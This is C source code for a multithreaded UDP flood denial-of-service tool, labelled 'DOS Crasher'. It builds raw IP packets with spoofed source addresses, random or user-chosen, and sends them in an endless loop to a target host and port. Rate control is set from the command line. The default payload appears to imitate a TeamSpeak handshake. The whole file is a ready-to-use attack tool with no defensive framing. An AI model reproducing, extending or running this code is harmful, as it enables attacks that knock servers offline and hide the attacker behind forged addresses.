#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <pthread.h>
#include <netinet/udp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netdb.h>
#include <net/if.h>
#include <arpa/inet.h>
#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9
static unsigned long int Q[4096], c = 362436;
volatile int limiter;
volatile int port;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;
char str[44];
int *verim[4];
int ai=0;


void init_rand(unsigned long int x)
{
        int i;
        Q[0] = x;
        Q[1] = x + PHI;
        Q[2] = x + PHI + PHI;
        for (i = 3; i < 4096; i++){ Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; }
}
unsigned long int rand_cmwc(void)
{
        unsigned long long int t, a = 18782LL;
        static unsigned long int i = 4095;
        unsigned long int x, r = 0xfffffffe;
        i = (i + 1) & 4095;
        t = a * Q[i] + c;
        c = (t >> 32);
        x = t + c;
        if (x < c) {
        x++;
        c++;
        }
        return (Q[i] = r - x);
}
unsigned short csum (unsigned short *buf, int count)
{
        register unsigned long sum = 0;
        while( count > 1 ) { sum += *buf++; count -= 2; }
        if(count > 0) { sum += *(unsigned char *)buf; }
        while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
        return (unsigned short)(~sum);
}
unsigned short udpcsum(struct iphdr *iph, struct udphdr *udph) {
    struct udp_pseudo
    {
    unsigned long src_addr;
    unsigned long dst_addr;
    unsigned char zero;
    unsigned char proto;
    unsigned short length;
    } pseudohead;
    unsigned short total_len = iph->tot_len;
    pseudohead.src_addr=iph->saddr;
    pseudohead.dst_addr=iph->daddr;
    pseudohead.zero=0;
    pseudohead.proto=IPPROTO_UDP;
    pseudohead.length=htons(sizeof(struct udphdr));
    int totaltudp_len = sizeof(struct udp_pseudo) + sizeof(struct udphdr);
    unsigned short *udp = malloc(totaltudp_len);
    memcpy((unsigned char *)udp,&pseudohead,sizeof(struct udp_pseudo));
    memcpy((unsigned char *)udp+sizeof(struct udp_pseudo),(unsigned char *)udph,sizeof(struct udphdr));
    unsigned short output = csum(udp,totaltudp_len);
    free(udp);
    return output;
}
void setup_ip_header(struct iphdr *iph)
{
        char ip[17];
        snprintf(ip, sizeof(ip)-1, "%d.%d.%d.%d", rand()%255, rand()%255, rand()%255, rand()%255);
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
		iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + rand()%100;
        iph->id = htonl(rand()%54321);
        iph->frag_off = 0;
        iph->ttl = MAXTTL;
        iph->protocol = IPPROTO_UDP;
        iph->check = 0;
        iph->saddr = inet_addr(ip);
		
}
void pizzas(struct udphdr *udph)
{
    
	udph->source = htons(rand()%65535);
	udph->check = 0;
	memcpy((void *)udph + sizeof(struct udphdr), str, rand()%100);
	udph->len=htons(sizeof(struct udphdr) + rand()%100);


		
}
void *flood(void *par1)
{
        char *td = (char *)par1;
        char datagram[MAX_PACKET_SIZE];
        struct iphdr *iph = (struct iphdr *)datagram;
        struct udphdr *udph = (void *)iph + sizeof(struct iphdr);
        struct sockaddr_in sin;
        sin.sin_family = AF_INET;
        sin.sin_addr.s_addr = inet_addr(td);
        int s = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
        if(s < 0){
        fprintf(stderr, "Could not open raw socket.\n");
        exit(-1);
        }
        memset(datagram, 0, MAX_PACKET_SIZE);
        setup_ip_header(iph);
        udph->source = htons(rand() % 65535 - 1026);
        pizzas(udph);
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = csum ((unsigned short *) datagram, iph->tot_len);
        int tmp = 1;
        const int *val = &tmp;
        if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
        fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
        exit(-1);
        }
        init_rand(time(NULL));
        register unsigned int i;
        i = 0;
        while(1){
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
		
		
		if(verim[0] != NULL && verim[1] != NULL && verim[2] != NULL && verim[3] != NULL){
			iph->saddr = (atoi(verim[3])) << 24 | (atoi(verim[2])) << 16  | (atoi(verim[1])) << 8 | (atoi(verim[0]));
		}
		if(verim[0] != NULL && verim[1] != NULL && verim[2] != NULL && verim[3] == NULL){
			iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (atoi(verim[2])) << 16  | (atoi(verim[1])) << 8 | (atoi(verim[0]));
		}
		if(verim[0] != NULL && verim[1] != NULL && verim[2] == NULL && verim[3] == NULL){
			iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16  | (atoi(verim[1])) << 8 | (atoi(verim[0]));
		}
		if(verim[0] != NULL && verim[1] == NULL && verim[2] == NULL && verim[3] == NULL){
			iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16  | (rand_cmwc() >> 8 & 0xFF) << 8 | (atoi(verim[0]));
		}
		if(verim[0] == NULL && verim[1] == NULL && verim[2] == NULL && verim[3] == NULL){
			iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
		}
		
			
        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
        iph->check = csum ((unsigned short *) datagram, iph->tot_len);
        udph->source = htons(rand_cmwc() & 0xFFFF);
        udph->check = 0;
		udph->dest = htons(port);
        pps++;
        if(i >= limiter)
        {
        i = 0;
        usleep(sleeptime);
        }
        i++;
        }
}



int main(int argc, char *argv[ ])
{

		
	
        if(argc < 5){
        fprintf(stderr, "DJ Pizza @ New Upgraded DOS Crasher v1\n");
        fprintf(stdout, "Usage: %s <hostname> <portnum> <thread> <pps> <time> < Src 185.x.x.x Or Null > < Hex or Null >\n", argv[0]);
        exit(-1);
        }
	
		if(argv[7] != NULL){
		sprintf(str,argv[7]);
		}else{
		sprintf(str,"\x54\x53\x33\x49\x4e\x49\x54\x31\x00\x65\x00\x00\x88\x02\xfd\x66\xd3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00");
		}

        fprintf(stdout, "Setting up Sockets...\n");
        int num_threads = atoi(argv[3]);
        int maxpps = atoi(argv[4]);
		port = atoi(argv[2]);
        limiter = 0;
        pps = 0;
        pthread_t thread[num_threads];
        int multiplier = 20;
        int i;
		


		
		verim[0] = strtok(argv[6],".");
        while(verim[ai] != NULL){
            verim[++ai] = strtok(NULL, ".");
        }

		
		
        for(i = 0;i<num_threads;i++){
        pthread_create( &thread[i], NULL, &flood, (void *)argv[1]);
        pthread_create( &thread[i], NULL, &flood, (void *)argv[1]);
        pthread_create( &thread[i], NULL, &flood, (void *)argv[1]);
        pthread_create( &thread[i], NULL, &flood, (void *)argv[1]);
        }
        fprintf(stdout, "Starting Flood...\n");
        for(i = 0;i<(atoi(argv[5])*multiplier);i++)
        {
        usleep((1000/multiplier)*1000);
        if((pps*multiplier) > maxpps)
        {
        if(1 > limiter)
        {
        sleeptime+=100;
        } else {
        limiter--;
        }
        } else {
        limiter++;
        if(sleeptime > 25)
        {
        sleeptime-=25;
        } else {
        sleeptime = 0;
        }
        }
        pps = 0;
        }
        return 0;
}
